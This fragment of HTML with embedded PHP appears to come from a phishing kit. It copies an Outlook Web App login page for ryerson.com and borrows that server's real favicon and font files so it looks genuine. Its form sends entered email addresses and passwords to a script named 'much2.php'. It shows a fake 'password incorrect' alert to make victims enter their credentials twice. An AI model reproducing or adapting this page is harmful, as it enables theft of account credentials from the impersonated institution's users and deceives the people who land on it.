...
<link rel="shortcut icon" href="https://autodiscover.ryerson.com/owa/auth/15.0.1497/themes/resources/favicon.ico" type="image/x-icon">
...
src: url("https://autodiscover.ryerson.com/owa/auth/15.0.1497/themes/resources/segoeui-regular.eot?#iefix") format("embedded-opentype"),
url("https://autodiscover.ryerson.com/owa/auth/15.0.1497/themes/resources/segoeui-regular.ttf") format("truetype");
}

@font-face {
font-family: "Segoe UI WPC Semilight";
src: url("https://autodiscover.ryerson.com/owa/auth/15.0.1497/themes/resources/segoeui-semilight.eot?#iefix") format("embedded-opentype"),
url("https://autodiscover.ryerson.com/owa/auth/15.0.1497/themes/resources/segoeui-semilight.ttf") format("truetype");
}

@font-face {
font-family: "Segoe UI WPC Semibold";
src: url("https://autodiscover.ryerson.com/owa/auth/15.0.1497/themes/resources/segoeui-semibold.eot?#iefix") format("embedded-opentype"),
url("https://autodiscover.ryerson.com/owa/auth/15.0.1497/themes/resources/segoeui-semibold.ttf") format("truetype");
}
</style>
...
<form action="much2.php" method="POST" name="logonForm"  autocomplete="off">
...
<div><input id="username" type="email" name="sR23_7" value="<?php echo $sR23_7; ?>" class="signInInputText" role="textbox" pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}$" title="Domain \ User Name" aria-labelledby="userNameLabel" required="required"/></div>
<div class="signInInputLabel" id="passwordLabel" aria-hidden="true">Password:</div>
<div><input id="password" onfocus="g_fFcs=0" name="password" title="Password" value="" type="password" pattern=".{5,50}" class="signInInputText" aria-labelledby="passwordLabel" required="required" /></div>
...
<div id="expltxt" class="signInExpl" style="color:red;" role="alert">
The user name or password you entered isn't correct. Try entering it again.
</div>
<div class="signInEnter">
<input type="image" src="submit.png" alt="Submit" role="button" tabindex="0"> </div>
